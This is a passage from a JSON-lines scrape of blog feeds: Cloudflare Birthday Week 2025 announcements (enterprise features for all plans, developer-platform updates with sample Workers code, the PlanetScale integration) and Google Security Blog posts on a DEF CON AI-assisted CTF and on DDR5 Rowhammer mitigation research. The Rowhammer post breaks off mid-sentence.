& Reliability\nSeptember 29, 2025 2:00 PM15 years of helping build a better Internet: a look back at Birthday Week 2025Rust-powered core systems, post-quantum upgrades, developer access for students, PlanetScale integration, open-source partnerships, and our biggest internship program ever — 1,111 interns in 2026....By Nikita Cano, Korinne AlpersBirthday Week, Partners, Developer Platform, Workers Launchpad, Performance, Security, Cache, Speed, Developers, AI, 1.1.1.1, Application Security, Application Services, Bots, CDN, Cloudflare for Startups, Cloudflare One, Cloudflare Zero Trust, Cloudflare Workers\nSeptember 26, 2025 2:00 PMCloudflare just got faster and more secure, powered by RustWe’ve replaced the original core system in Cloudflare with a new modular Rust-based proxy, replacing NGINX. ...By Richard Boulton, Steve Goldsmith, Maurizio Abba, Matthew BullockBirthday Week, Rust, NGINX, Deep Dive, Engineering\nSeptember 26, 2025 2:00 PMMonitoring AS-SETs and why they matterWe will cover some of the reasons why operators need to monitor the AS-SET memberships for their ASN, and now Cloudflare Radar can help. ...By Mingwei Zhang, Bryton HerdesBGP, RPKI, Birthday Week, Cloudflare Network, Radar\nSeptember 26, 2025 2:00 PMAn AI Index for all our customersCloudflare will soon automatically create an AI-optimized search index for your domain, and expose a set of ready-to-use standard APIs and tools including an MCP server, LLMs.txt, and a search API....By Celso Martinho, Anni WangAI, Birthday Week, Pay Per Crawl, AI Search, MCP", "timestamp": "2025-10-21T13:33:43.894201"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "Every Cloudflare feature, available to everyone", "url": "https://blog.cloudflare.com/enterprise-grade-features-for-all/", "published": "Thu, 25 Sep 2025 14:05:00 GMT", "content": "Every Cloudflare feature, available to everyone2025-09-25Dane Knecht5 min readOver the next year Cloudflare will make nearly every feature we offer available to any customer who wants to buy and use it regardless of whether they are an enterprise account. No need to pick up a phone and talk to a sales team member. No requirement to find time with a solutions engineer in our team to turn on a feature. No contract necessary. We believe that if you want to use something we offer, you should just be able to buy it.Today’s launch starts by bringing Single Sign-On (SSO) into our dashboard out of our enterprise plan and making it available to any user. That capability is the first of many. We will be sharing updates over the next few months as more and more features become available for purchase on any plan.We are also making a commitment to ensuring that all future releases will follow this model. The goal is not to restrict new tools to the enterprise tier for some amount of time before making them widely available. We believe helping build a better Internet means making sure the best tools are available to anyone who needs them. Enterprise grade for everyone It’s not enough to build the best tools on the web. At Cloudflare our mission is to help build a better Internet and that means making the tools we build accessible. We believe the best way to make the Internet faster and more secure is to put powerful features into the hands of as many people as possible.We first launched an Enterprise tier years ago when larger customers came to us looking to scale their usage of Cloudflare in new ways. They needed procurement options beyond a credit card, like invoices, custom contracts, and dedicated support. This offering was a necessary and important step to bring the benefits of our network and tools to large organizations with complex needs.This created an unintended side effect in how we shipped products. Some of our most powerful and innovative features were launched within an enterprise-only tier. This created a gap, a two-tiered system where some of the most advanced features were reserved only for the largest companies.It also created a divergence in our product development. Features built for our self-service customers had to be incredibly simple and intuitive from day-one. Features designated “enterprise-only” didn’t always face that same pressure to scale – we could instead rely on our solutions teams or partners to help set up and support.It’s time to fix that. Starting today, we are doing away with the concept of “enterprise-only” features. Over the coming months and quarters, we will make many of our most advanced capabilities available to all of our customers.The change will help build a more secure Internet by removing barriers to the adoption of the most advanced tools available. The change improves the experience for all customers. Smaller teams on our self-service plans will have access to the most powerful configuration options we offer. Existing enterprise teams will have easier pathways to adopt new tools without calling their account manager. And our own Product teams have even more reason to continue to make all features we ship easy to use.Today we are beginning with dashboard SSO with instructions on how to begin setting that up right now below. It is the first of many though and capabilities like apex proxying and expanded upload limits, along with many others of our most requested enterprise features, will follow. Starting with how you sign in to Cloudflare One example of a feature we launched only to enterprise customers because of the complexity in setting it up is SSO. Enterprise teams maintain their own identity provider where they can manage internal employee accounts and how their team members log into different services.They integrate these identity providers with the tools their employees need so that team members do not need to create and remember a username and password for each and every service. More importantly, the management of identity in a single place gives enterprises the ability to control authentication policies, onboard and offboard users, and hand out licenses for tools.We first launched our own SSO support way back in 2018. In the last seven years we have been helping thousands of enterprise customers manually set this up, but we know that teams of all sizes rely on the security and convenience of an identity provider. As part of this announcement, the first enterprise feature we are making available to everyone is dashboard SSO.The functionality is available immediately to anyone on any plan. To get started, follow the instructions here to integrate your identity provider with Cloudflare and to then connect your domain with your account. By setting up your identity provider for dashboard SSO you will also be able to begin using the vast majority of our Zero Trust security features, as well, which are available at no cost for up to 50 users.We also know that some teams are too early or distributed to have a full-fledged identity provider but want the convenience and security of managing logins in one place. To that end, we are also excited to launch support for GitHub as a social login provider to the Cloudflare dashboard as part of today’s announcement. And extending to almost everything else over the next year We prioritized dashboard SSO because just about every team that uses Cloudflare wants it. This one change helps make nearly every customer safer by allowing them to centrally manage team access. As we burn down the list of previously enterprise-only features, we will continue targeting those that have similar broad impact.Some capabilities, like Magic Transit, have less broad appeal. The organizations that maintain their own networks and want to deploy Magic Transit tend to already want to be enterprise customers for account management reasons. That said, we still can improve their experience by making tools like Magic Transit available to all plans because we will have to remove some of the friction in the setup that we have historically just solved with people hours from our solution engineers and partners.We also realize that the way some of these features are priced only made sense with an invoice or enterprise license agreement model. To make this work, we need to revisit how some of our usage metering and billing functions. That will continue to be a priority for us, and we are excited about how this will push us to continue making our packaging and billing even simpler for all customers.There are some features that we can’t make available to everyone because of non-technical reasons. For example, using our China Network has complicated legal requirements in China that are impossible for us to manage for millions of customers. Self-service by default going forward One thing we are not announcing today is a strategy to continue to release “enterprise-only” features for a while before they eventually make it to the self-service plans. Going forward, to launch something at Cloudflare the team will need to make sure that any customer can buy it off the shelf without talking to someone.We expect that requirement to improve how all products are built here, not just the more advanced capabilities. We also consider it mission-critical. We have a long history of making the kinds of tools that only the largest businesses could buy available to anyone, from universal SSL over a decade ago to newer features this week that were available for self-service plans immediately like per-customer bot detection IDs and security of data in transit between SaaS applications. We are excited to continue this tradition. What’s next? You can get started right now setting up dashboard SSO in your Cloudflare account using the documentation available here. We will continue to share updates as previously enterprise-only features are made available to any plan. Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. Birthday WeekPAYGOEnterprisePlans\nSeptember 29, 2025 2:00 PM15 years of helping build a better Internet: a look back at Birthday Week 2025Rust-powered core systems, post-quantum upgrades, developer access for students, PlanetScale integration, open-source partnerships, and our biggest internship program ever — 1,111 interns in 2026....By Nikita Cano, Korinne AlpersBirthday Week, Partners, Developer Platform, Workers Launchpad, Performance, Security, Cache, Speed, Developers, AI, 1.1.1.1, Application Security, Application Services, Bots, CDN, Cloudflare for Startups, Cloudflare One, Cloudflare Zero Trust, Cloudflare Workers\nSeptember 26, 2025 2:00 PMCloudflare just got faster and more secure, powered by RustWe’ve replaced the original core system in Cloudflare with a new modular Rust-based proxy, replacing NGINX. ...By Richard Boulton, Steve Goldsmith, Maurizio Abba, Matthew BullockBirthday Week, Rust, NGINX, Deep Dive, Engineering\nSeptember 26, 2025 2:00 PMMonitoring AS-SETs and why they matterWe will cover some of the reasons why operators need to monitor the AS-SET memberships for their ASN, and now Cloudflare Radar can help. ...By Mingwei Zhang, Bryton HerdesBGP, RPKI, Birthday Week, Cloudflare Network, Radar\nSeptember 26, 2025 2:00 PMAn AI Index for all our customersCloudflare will soon automatically create an AI-optimized search index for your domain, and expose a set of ready-to-use standard APIs and tools including an MCP server, LLMs.txt, and a search API....By Celso Martinho, Anni WangAI, Birthday Week, Pay Per Crawl, AI Search, MCP", "timestamp": "2025-10-21T13:33:44.700320"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "Cloudflare's developer platform keeps getting better, faster, and more powerful. Here's everything that's new.", "url": "https://blog.cloudflare.com/cloudflare-developer-platform-keeps-getting-better-faster-and-more-powerful/", "published": "Thu, 25 Sep 2025 14:00:00 GMT", "content": "Cloudflare's developer platform keeps getting better, faster, and more powerful. Here's everything that's new.2025-09-25Brendan Irvine-BroqueRita KozlovKorinne Alpers8 min readWhen you build on Cloudflare, we consider it our job to do the heavy lifting for you. That’s been true since we introduced Cloudflare Workers in 2017, when we first provided a runtime for you where you could just focus on building. That commitment is still true today, and many of today’s announcements are focused on just that — removing friction where possible to free you up to build something great. There are only so many blog posts we can write (and that you can read)! We have been busy on a much longer list of new improvements, and many of them we’ve been rolling out consistently over the course of the year. Today’s announcement breaks down all the new capabilities in detail, in one single post. The features being released today include:Use more APIs from Node.js — including node:fs and node:httpsUse models from different providers in AI Search (formerly AutoRAG)Deploy larger container instances and more concurrent instances to our Containers platformRun 30 concurrent headless web browsers (previously 10), via the Browser Rendering APIUse the Playwright browser automation library with the Browser Rendering API — now fully supported and GAUse 4 vCPUs (prev 2) and 20GB of disk (prev 8GB) with Workers Builds — now GAConnect to production services and resources from local development with Remote Bindings — now GAR2 Infrequent Access GA - lower-cost storage class for backups, logs, and long-tail contentResize, clip and reformat video files on-demand with Media Transformations — now GAAlongside that, we’re constantly adding new building blocks, to make sure you have all the tools you need to build what you set out to. Those launches (that also went out today, but require a bit more explanation) include:Connect to Postgres databases running on PlanetscaleSend transactional emails via the new Cloudflare Email ServiceRun distributed SQL queries with the new Cloudflare Data PlatformDeploy your own AI vibe coding platform to Cloudflare with VibeSDK AI Search (formerly AutoRAG) — now with More Models To Choose From AutoRAG is now AI Search! The new name marks a new and bigger mission: to make world-class search infrastructure available to every developer and business. AI Search is no longer just about retrieval for LLM apps: it’s about giving you a fast, flexible index for your content that is ready to power any AI experience. With recent additions like NLWeb support, we are expanding beyond simple retrieval to provide a foundation for top quality search experiences that are open and built for the future of the web.With AI Search you can now use models from different providers like OpenAI and Anthropic. Last month during AI Week we announced BYO Provider Keys for AI Gateway. That capability now extends to AI Search. By attaching your keys to the AI Gateway linked to your AI Search instance, you can use many more models for both embedding and inference. Once configured, your AI Search instance will be able to reference models available through your AI Gateway when making a /ai-search request: export default { async fetch(request, env) { // Query your AI Search instance with a natural language question to an OpenAI model const result = await env.AI.autorag(\"my-ai-search\").aiSearch({ query: \"What's new for Cloudflare Birthday Week?\", model: \"openai/gpt-5\" }); // Return only the generated answer as plain text return new Response(result.response, { headers: { \"Content-Type\": \"text/plain\" }, }); }, }; In the coming weeks we will also roll out updates to align the APIs with the new name. The existing APIs will continue to be supported for the time being. Stay tuned to the AI Search Changelog and Discord for more updates! Connect to production services and resources from local development with Remote Bindings — now GA Remote bindings for local development are generally available, supported in Wrangler v4.37.0, the Cloudflare Vite plugin, and the @cloudflare/vitest-pool-workers package. Remote bindings are bindings that are configured to connect to a deployed resource on your Cloudflare account instead of the locally simulated resource. For example, here’s how you can instruct Wrangler or Vite to send all requests to env.MY_BUCKET to hit the real, deployed R2 bucket instead of a locally simulated one: { \"name\": \"my-worker\", \"compatibility_date\": \"2025-09-25\", \"r2_buckets\": [ { \"bucket_name\": \"my-bucket\", \"binding\": \"MY_BUCKET\", \"remote\": true }, ], } With the above configuration, all requests to env.MY_BUCKET will be proxied to the remote resource, but the Worker code will still execute locally. This means you get all the benefits of local development like faster execution times – without having to seed local databases with data. You can pair remote bindings with environments, so that you can use staging data during local development and leave production data untouched. For example, here’s how you could point Wrangler or Vite to send all requests to env.MY_BUCKET to staging-storage-bucket when you run wrangler dev --env staging (CLOUDFLARE_ENV=staging vite dev if using Vite). { \"name\": \"my-worker\", \"compatibility_date\": \"2025-09-25\", \"env\": { \"staging\": { \"r2_buckets\": [ { \"binding\": \"MY_BUCKET\", \"bucket_name\": \"staging-storage-bucket\", \"remote\": true } ] }, \"production\": { \"r2_buckets\": [ { \"binding\": \"MY_BUCKET\", \"bucket_name\": \"production-storage-bucket\" } ] } } } More Node.js APIs and packages “just work” on Workers Over the past year, we have been hard at work to make Workers more compatible with Node.js packages and APIs.Several weeks ago, we shared how node:http and node:https APIs are now supported on Workers. This means that you can run backend Express and Koa.js work with only a few additional lines of code: import { httpServerHandler } from 'cloudflare:node'; import express from 'express'; const app = express(); app.get('/', (req, res) => { res.json({ message: 'Express.js running on Cloudflare Workers!' }); }); app.listen(3000); export default httpServerHandler({ port: 3000 }); And there’s much, much more. You can now:Read and write temporary files in Workers, using node:fsDo DNS looking using 1.1.1.1 with node:dnsUse node:net and node:tls for first class Socket supportUse common hashing libraries with node:cryptoAccess environment variables in a Node-like fashion on process.envRead our full recap of the last year’s Node.js-related changes for all the details.With these changes, Workers become even more powerful and easier to adopt, regardless of where you’re coming from. The APIs that you are familiar with are there, and more packages you need will just work. Larger Container instances, more concurrent instances Cloudflare Containers now has higher limits on concurrent instances and an upcoming new, larger instance type.Previously you could run 50 instances of the dev instance type or 25 instances of the basic instance type concurrently. Now you can run concurrent containers with up to 400 GiB of memory, 100 vCPUs, and 2 TB of disk. This allows you to run up to 1000 dev instances or 400 basic instances concurrently. Enterprise customers can push far beyond these limits — contact us if you need more. If you are using Containers to power your app and it goes viral, you’ll have the ability to scale on Cloudflare.Cloudflare Containers also now has a new instance type coming soon — standard-2 which includes 8 GiB of memory, 1 vCPU, and 12 GB of disk. This new instance type is an ideal default for workloads that need more resources, from AI Sandboxes to data processing jobs. Workers Builds provides more disk and CPU — and is now GA Last Birthday Week, we announced the launch of our integrated CI/CD pipeline, Workers Builds, in open beta. We also gave you a detailed look into how we built this system on our Workers platform using Containers, Durable Objects, Hyperdrive, Workers Logs, and Smart Placement.This year, we are excited to announce that Workers Builds is now Generally Available. Here’s what’s new:Increased disk space for all plans: We've increased the disk size from 8 GB to 20 GB for both free and paid plans, giving you more space for your projects and dependenciesMore compute for paid plans: We’ve doubled the CPU power for paid plans from 2 vCPU to 4 vCPU, making your builds significantly fasterFaster single-core and multi-core performance: To ensure consistent, high performance builds, we now run your builds on the fastest available CPUs at the time your build runsHaven’t used Workers Builds yet? You can try it by connecting a Git repository to an existing Worker, or try it out on a fresh new project by clicking any Deploy to Cloudflare button, like the one below that deploys a blog built with Astro to your Cloudflare account: A more consistent look and feel for the Cloudflare dashboard Durable Objects, R2, and Workers now all have a more consistent look with the rest of our developer platform. As you explore these pages you’ll find that things should load faster, feel smoother and are easier to use.Across storage products, you can now customize the table that lists the resources on your account, choose which data you want to see, sort by any column, and hide columns you don’t need. In the Workers and Pages dashboard, we’ve reduced clutter and have modernized the design to make it faster for you to get the data you need. And when you create a new Pipeline or a Hyperdrive configuration, you’ll find a new interface that helps you get started and guides you through each step. This work is ongoing, and we’re excited to continue improving with the help of your feedback, so keep it coming! Resize, clip and reformat video files on-demand with Media Transformations — now GA In March 2025 we announced Media Transformations in open beta, which brings the magic of Image transformations to short-form video files — including video files stored outside of Cloudflare. Since then, we have increased input and output limits, and added support for audio-only extraction. Media Transformations is now generally available.Media Transformations is ideal if you have a large existing volume of short videos, such as generative AI output, e-commerce product videos, social media clips, or short marketing content. Content like this should be fetched from your existing storage like R2 or S3 directly, optimized by Cloudflare quickly, and delivered efficiently as small MP4 files or used to extract still images and audio. https://example.com/cdn-cgi/media/<OPTIONS>/<SOURCE-VIDEO> EXAMPLE, RESIZE: https://example.com/cdn-cgi/media/width=760/https://pub-d9fcbc1abcd244c1821f38b99017347f.r2.dev/aus-mobile.mp4 EXAMPLE, STILL THUMBNAIL: https://example.com/cdn-cgi/media/mode=frame,time=3s,width=120,height=120,fit=cover/https://pub-d9fcbc1abcd244c1821f38b99017347f.r2.dev/aus-mobile.mp4 Media Transformations includes a free tier available to all customers and is included with Media Platform subscriptions. Check out the transform videos documentation for all the latest, then enable transformations for your zone today! Infrequent Access in R2 is now GA R2 Infrequent Access is now generally available. Last year, we introduced the Infrequent Access storage class designed for data that doesn’t need to be accessed frequently. It’s a great fit for use cases including long-tail user content, logs, or data backups.Since launch, Infrequent Access has been proven in production by our customers running these types of workloads at scale. The results confirmed our goal: a storage class that reduces storage costs while maintaining performance and durability.Pricing is simple. You pay less on data storage, while data retrievals are billed per GB to reflect the additional compute required to serve data from underlying storage optimized for less frequent access. And as with all of R2, there are no egress fees, so you don’t pay for the bandwidth to move data out. Here’s how you can upload an object to R2 infrequent access class via Workers: export default { async fetch(request, env) { // Upload the incoming request body to R2 in Infrequent Access class await env.MY_BUCKET.put(\"my-object\", request.body, { storageClass: \"InfrequentAccess\", }); return new Response(\"Object uploaded to Infrequent Access!\", { headers: { \"Content-Type\": \"text/plain\" }, }); }, }; You can also monitor your Infrequent Access vs. Standard storage usage directly in your R2 dashboard for each bucket. Get started with R2 today! Playwright in Browser Rendering is now GA We’re excited to announce three updates to Browser Rendering:Our support for Playwright is now Generally Available, giving developers the stability and confidence to run critical browser tasks.We’re introducing support for Stagehand, enabling developers to build AI agents using natural language, powered by Cloudflare Workers AI.Finally, to help developers scale, we are tripling limits for paid plans, with more increases to come. The browser is no longer only used by humans. AI agents need to be able to reliably navigate browsers in the same way a human would, whether that's booking flights, filling in customer info, or scraping structured data. Playwright gives AI agents the ability to interact with web pages and perform complex tasks on behalf of humans. However, running browsers at scale is a significant infrastructure challenge. Cloudflare Browser Rendering solves this by providing headless browsers on-demand. By moving Playwright support to Generally Available, and now synced with the latest version v1.55, customers have a production-ready foundation to build reliable, scalable applications on. To help AI agents better navigate the web, we’re introducing support for Stagehand, an open source browser automation framework. Rather than dictating exact steps or specifying selectors, Stagehand enables developers to build more reliably and flexibly by combining code with natural-language instructions powered by AI. This makes it possible for AI agents to navigate and adapt if a website changes - just like a human would. To get started with Playwright and Stagehand, check our changelog with code examples and more. Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. Developer PlatformBirthday WeekCloudflare Workers\nOctober 14, 2025 8:00 PMUnpacking Cloudflare Workers CPU Performance BenchmarksCloudflare investigated CPU performance benchmark results for Workers, uncovering and fixing issues in infrastructure, V8 garbage collection, and OpenNext optimizations. ...By Kenton VardaCloudflare Workers, Developer Platform, Developers\nSeptember 30, 2025 3:50 PMPayload on Workers: a full-fledged CMS, running entirely on Cloudflare’s stackWe demonstrate how the open-source Payload CMS was ported to run entirely on Cloudflare's developer platform....By Jason Kincaid, Ricardo TavaresCloudflare Workers\nSeptember 29, 2025 2:00 PM15 years of helping build a better Internet: a look back at Birthday Week 2025Rust-powered core systems, post-quantum upgrades, developer access for students, PlanetScale integration, open-source partnerships, and our biggest internship program ever — 1,111 interns in 2026....By Nikita Cano, Korinne AlpersBirthday Week, Partners, Developer Platform, Workers Launchpad, Performance, Security, Cache, Speed, Developers, AI, 1.1.1.1, Application Security, Application Services, Bots, CDN, Cloudflare for Startups, Cloudflare One, Cloudflare Zero Trust, Cloudflare Workers\nSeptember 26, 2025 2:00 PMMonitoring AS-SETs and why they matterWe will cover some of the reasons why operators need to monitor the AS-SET memberships for their ASN, and now Cloudflare Radar can help. ...By Mingwei Zhang, Bryton HerdesBGP, RPKI, Birthday Week, Cloudflare Network, Radar", "timestamp": "2025-10-21T13:33:45.584054"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "Partnering to make full-stack fast: deploy PlanetScale databases directly from Workers", "url": "https://blog.cloudflare.com/planetscale-postgres-workers/", "published": "Thu, 25 Sep 2025 14:00:00 GMT", "content": "Partnering to make full-stack fast: deploy PlanetScale databases directly from Workers2025-09-25Matt SilverlockThomas GauvinAdrian Gracia 4 min readWe’re not burying the lede on this one: you can now connect Cloudflare Workers to your PlanetScale databases directly and ship full-stack applications backed by Postgres or MySQL. We’ve teamed up with PlanetScale because we wanted to partner with a database provider that we could confidently recommend to our users: one that shares our obsession with performance, reliability and developer experience. These are all critical factors for any development team building a serious application. Now, when connecting to PlanetScale databases, your connections are automatically configured for optimal performance with Hyperdrive, ensuring that you have the fastest access from your Workers to your databases, regardless of where your Workers are running. Building full-stack As Workers has matured into a full-stack platform, we’ve introduced more options to facilitate your connectivity to data. With Workers KV, we made it easy to store configuration and cache unstructured data on the edge. With D1 and Durable Objects, we made it possible to build multi-tenant apps with simple, isolated SQL databases. And with Hyperdrive, we made connecting to external databases fast and scalable from Workers.Today, we’re introducing a new choice for building on Cloudflare: Postgres and MySQL PlanetScale databases, directly accessible from within the Cloudflare dashboard. Link your Cloudflare and PlanetScale accounts, stop manually copying API keys back-and-forth, and connect Workers to any of your PlanetScale databases (production or otherwise!). Connect to a PlanetScale database — no figuring things out on your ownPostgres and MySQL are the most popular options for building applications, and with good reason. Many large companies have built and scaled on these databases, providing for a robust ecosystem (like Cloudflare!). And you may want to have access to the power, familiarity, and functionality that these databases provide. Importantly, all of this builds on Hyperdrive, our distributed connection pooler and query caching infrastructure. Hyperdrive keeps connections to your databases warm to avoid incurring latency penalties for every new request, reduces the CPU load on your database by managing a connection pool, and can cache the results of your most frequent queries, removing load from your database altogether. Given that about 80% of queries for a typical transactional database are read-only, this can be substantial — we’ve observed this in reality! No more copying credentials around Starting today, you can connect to your PlanetScale databases from the Cloudflare dashboard in just a few clicks. Connecting is now secure by default with a one-click password rotation option, without needing to copy and manage credentials back and forth. A Hyperdrive configuration will be created for your PlanetScale database, providing you with the optimal setup to start building on Workers.And the experience spans both Cloudflare and PlanetScale dashboards: you can also create and view attached Hyperdrive configurations for your databases from the PlanetScale dashboard. By automatically integrating with Hyperdrive, your PlanetScale databases are optimally configured for access from Workers. When you connect your database via Hyperdrive, Hyperdrive’s Placement system automatically determines the location of the database and places its pool of database connections in Cloudflare data centers with the lowest possible latency. When one of your Workers connects to your Hyperdrive configuration for your PlanetScale database, Hyperdrive will ensure the fastest access to your database by eliminating the unnecessary roundtrips included in a typical database connection setup. Hyperdrive will resolve connection setup within the Hyperdrive client and use existing connections from the pool to quickly serve your queries. Better yet, Hyperdrive allows you to cache your query results in case you need to scale for high-read workloads. This is a peek under the hood of how Hyperdrive makes access to PlanetScale as fast as possible. We’ve previously blogged about Hyperdrive’s technical underpinnings — it’s worth a read. And with this integration with Hyperdrive, you can easily connect to your databases across different Workers applications or environments, without having to reconfigure your credentials. All in all, a perfect match. Get started with PlanetScale and Workers With this partnership, we’re making it trivially easy to build on Workers with PlanetScale. Want to build a new application on Workers that connects to your existing PlanetScale cluster? With just a few clicks, you can create a globally deployed app that can query your database, cache your hottest queries, and keep your database connections warmed for fast access from Workers. Connect directly to your PlanetScale MySQL or Postgres databases from the Cloudflare dashboard, for optimal configuration with Hyperdrive.To get started, you can:Head to the Cloudflare dashboard and connect your PlanetScale account… or head to PlanetScale and connect your Cloudflare account… and then deploy a WorkerReview the Hyperdrive docs and/or the PlanetScale docs to learn more about how to connect Workers to PlanetScale and start shipping.Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. HyperdriveBirthday WeekCloudflare WorkersPartnershipDatabase\nOctober 14, 2025 8:00 PMUnpacking Cloudflare Workers CPU Performance BenchmarksCloudflare investigated CPU performance benchmark results for Workers, uncovering and fixing issues in infrastructure, V8 garbage collection, and OpenNext optimizations. ...By Kenton VardaCloudflare Workers, Developer Platform, Developers\nSeptember 30, 2025 3:50 PMPayload on Workers: a full-fledged CMS, running entirely on Cloudflare’s stackWe demonstrate how the open-source Payload CMS was ported to run entirely on Cloudflare's developer platform....By Jason Kincaid, Ricardo TavaresCloudflare Workers\nSeptember 29, 2025 2:00 PM15 years of helping build a better Internet: a look back at Birthday Week 2025Rust-powered core systems, post-quantum upgrades, developer access for students, PlanetScale integration, open-source partnerships, and our biggest internship program ever — 1,111 interns in 2026....By Nikita Cano, Korinne AlpersBirthday Week, Partners, Developer Platform, Workers Launchpad, Performance, Security, Cache, Speed, Developers, AI, 1.1.1.1, Application Security, Application Services, Bots, CDN, Cloudflare for Startups, Cloudflare One, Cloudflare Zero Trust, Cloudflare Workers\nSeptember 26, 2025 2:00 PMMonitoring AS-SETs and why they matterWe will cover some of the reasons why operators need to monitor the AS-SET memberships for their ASN, and now Cloudflare Radar can help. ...By Mingwei Zhang, Bryton HerdesBGP, RPKI, Birthday Week, Cloudflare Network, Radar", "timestamp": "2025-10-21T13:33:46.495854"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Accelerating adoption of AI for cybersecurity at DEF CON 33", "url": "http://security.googleblog.com/2025/09/accelerating-adoption-of-ai-for.html", "published": "2025-09-24T14:42:00.003-04:00", "content": "Empowering cyber defenders with AI is critical to tilting the cybersecurity balance back in their favor as they battle cybercriminals and keep users safe. To help accelerate adoption of AI for cybersecurity workflows, we partnered with Airbus at DEF CON 33 to host the GenSec Capture the Flag (CTF), dedicated to human-AI collaboration in cybersecurity. Our goal was to create a fun, interactive environment, where participants across various skill levels could explore how AI can accelerate their daily cybersecurity workflows.\nThe CTF also offered a valuable opportunity for the community to use Sec-Gemini, Google’s experimental Cybersecurity AI, as an optional assistant available in the UI alongside major LLMs. And we received great feedback on Sec-Gemini, with 77% of respondents saying that they had found Sec-Gemini either “very helpful” or “extremely helpful” in assisting them with solving the challenges.\nWe want to thank the DEF CON community for the enthusiastic participation and for making this inaugural event a resounding success. The community feedback during the event has been invaluable for understanding how to improve Sec-Gemini, and we are already incorporating some of the lessons learned into the next iteration.\nWe are committed to advancing the AI cybersecurity frontier and will continue working with the community to build tools that help protect people online. Stay tuned as we plan to share more research and key learnings from the CTF with the broader community.\nPost a Comment", "timestamp": "2025-10-21T13:33:49.460737"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Supporting Rowhammer research to protect the DRAM ecosystem", "url": "http://security.googleblog.com/2025/09/supporting-rowhammer-research-to.html", "published": "2025-09-15T13:01:00.000-04:00", "content": "To address this gap and help the ecosystem with deploying robust defenses, Google has supported academic research and developed test platforms to analyze DDR5 memory. Our effort has led to the discovery of new attacks and a deeper understanding of Rowhammer on the current DRAM modules, helping to forge the way for further, stronger mitigations.\nRowhammer exploits a vulnerability in DRAM. DRAM cells store data as electrical charges, but these electric charges leak over time, causing data corruption. To prevent data loss, the memory controller periodically refreshes the cells. However, if a cell discharges before the refresh cycle, its stored bit may corrupt. Initially considered a reliability issue, it has been leveraged by security researchers to demonstrate privilege escalation attacks. By repeatedly accessing a memory row, an attacker can cause bit flips in neighboring rows. An adversary can exploit Rowhammer via:\nReliably cause bit flips by repeatedly accessing adjacent DRAM rows.\nCoerce other applications or the OS into using these vulnerable memory pages.\nTarget security-sensitive code or data to achieve privilege escalation.\nOr simply corrupt system’s memory to cause denial of service.\nPrevious work has repeatedly demonstrated the possibility of such attacks from software [Revisiting rowhammer, Are we susceptible to rowhammer?, Drammer, Flip feng shui, Jolt]. As a result, defending against Rowhammer is required for secure isolation in multi-tenant environments like the cloud.\nThe primary approach to mitigate Rowhammer is to detect which memory rows are being aggressively accessed and refreshing nearby rows before a bit flip occurs. TRR is a common example, which uses a number of counters to track accesses to a small number of rows adjacent to a potential victim row. If the access count for these aggressor rows reaches a certain threshold, the system issues a refresh to the victim row. TRR can be incorporated within the DRAM or in the host CPU.\nHowever, this mitigation is not foolproof. For example, the TRRespass attack showed that by simultaneously hammering multiple, non-adjacent rows, TRR can be bypassed. Over the past couple of years, more sophisticated attacks [Half-Double, Blacksmith] have emerged, introducing more efficient attack patterns.\nIn response, one of our efforts was to collaborate with JEDEC, external researchers, and experts to define the PRAC as a new mitigation that deterministically detects Rowhammer by tracking all memory rows.\nHowever, current systems equipped with DDR5 lack support for PRAC or other robust mitigations. As a result, they rely on probabilistic approaches such as ECC and enhanced TRR to reduce the risk. While these measures have mitigated older attacks, their overall effectiveness against new techniques was not fully understood until our recent findings.\nMitigating Rowhammer attacks involves making it difficult for an attacker to reliably cause bit flips from software. Therefore, for an effective mitigation, we have to understand how a determined adversary introduces memory accesses that bypass existing mitigations. Three key information components can help with such an analysis:\nHow the improved TRR and in-DRAM ECC work.\nHow memory access patterns from software translate into low-level DDR commands.\n(Optionally) How any mitigations (e.g., ECC or TRR) in the host processor work.\nThe first step is particularly challenging and involves reverse-engineering the proprietary in-DRAM TRR mechanism, which varies significantly between different manufacturers and device models. This process requires the ability to issue precise DDR commands to DRAM and analyze its responses, which is difficult on an off-the-shelf system. Therefore, specialized test platforms are essential.\nThe second and third steps involve analyzing the DDR traffic between the host processor and the DRAM. This can be done using an off-the-shelf interposer, a tool that sits between the processor and DRAM. A crucial part of this analysis is understanding how a live system translates software-level memory accesses into the DDR protocol.\nThe third step, which involves analyzing host-side mitigations, is sometimes optional. For example, host-side ECC (Error Correcting Code) is enabled by default on servers, while host-side TRR has only been implemented in some CPUs.\nFor the first challenge, we partnered with Antmicro to develop two specialized, open-source FPGA-based Rowhammer test platforms. These platforms allow us to conduct in-depth testing on different types of DDR5 modules.\nDDR5 RDIMM Platform: A new DDR5 Tester board to meet the hardware requirements of Registered DIMM (RDIMM) memory, common in server computers.\nSO-DIMM Platform: A version that supports the standard SO-DIMM pinout compatible with off-the-shelf DDR5 SO-DIMM memory sticks, common in workstations and end-user devices.\nAntmicro designed and manufactured these open-source platforms and we worked closely with them, and researchers from ETH Zurich, to test the applicability of these platforms for analyzing off-the-shelf memory modules in RDIMM and SO-DIMM forms.\nAntmicro DDR5 RDIMM FPGA test platform in action.\nIn collaboration with researchers from ETH, we applied the new Rowhammer test platforms to evaluate the effectiveness of current in-DRAM DDR5 mitigations. Our findings, detailed in the recently co-authored \"Phoenix” research paper, reveal that we successfully developed custom attack patterns capable of bypassing enhanced TRR (Target Row Refresh) defense on 